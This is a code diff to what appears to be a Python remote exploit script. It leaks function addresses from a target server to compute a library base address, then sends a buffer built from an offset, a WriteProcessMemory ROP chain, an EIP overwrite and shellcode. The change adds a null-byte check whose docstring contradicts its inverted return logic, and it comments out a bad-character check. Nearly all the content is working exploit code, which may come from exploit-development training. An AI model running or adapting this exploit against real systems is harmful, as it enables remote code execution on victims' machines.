@@ -256,6 +256,14 @@ def checkBadChars(data):
     return False
 
 
+def checkNullBytes(data) -> bool:
+    """Check if the given data contains null bytes. Iterate 0x00 at a time and return True if found, else False. Ensures bytes are read in groups of 2"""
+    for i in range(0, len(data), 2):
+        if data[i : i + 2] == b"\x00\x00":
+            return False
+    return True
+
+
 DEBUG_Response = False
 
 
@@ -465,7 +473,14 @@ def main():
         """
         # Leak addresses of functions
         for func in functions:
-            leakedAddresses.append(leakFunctionAddress(func, (server, port)))
+            # If addr is good i.e. no null bytes, append to list, else exit
+            leakedAddress = leakFunctionAddress(func, (server, port))
+
+            if checkNullBytes(pack("<L", leakedAddress)):
+                leakedAddresses.append(leakedAddress)
+            else:
+                log(f"Leaked address for {func.decode('utf-8').strip(chr(0))} contains null bytes {hex(leakedAddress)}", level="-")
+                sys.exit(1)
 
         WPMAddr = leakedAddresses[1]  # WriteProcessMemory address
         exportedFunc = leakedAddresses[0]  # N98E_CRYPTO_get_new_lockid address
@@ -475,14 +490,14 @@ def main():
 
         libeay32ibm019 = exportedFunc - functionOffset
 
-        # If our base address is not favorable, log it and exit
-        BASE_ADDR_BAD = checkBadChars(pack("<L", libeay32ibm019))
-        if BASE_ADDR_BAD:
-            log(
-                f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))} contains bad chars",
-                level="-",
-            )
-            sys.exit(1)
+        # # If our base address is not favorable, log it and exit
+        # BASE_ADDR_BAD = checkBadChars(pack("<L", libeay32ibm019))
+        # if BASE_ADDR_BAD:
+        #     log(
+        #         f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))} contains bad chars",
+        #         level="-",
+        #     )
+        #     sys.exit(1)
 
         log(
             f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))}",
@@ -686,13 +701,6 @@ def main():
         buffer = offset + wpm + eip + rop + offset2 + shellcode + padding
         buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
         buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04
-
-        # Warn Base Address(es) might be bad
-        if BASE_ADDR_BAD:
-            log(
-                "One or more leaked addresses contain bad characters, base address calculations may be incorrect",
-                level="!",
-            )
 
         # Send Final Buffer
         log("Sending final buffer...", level="*")
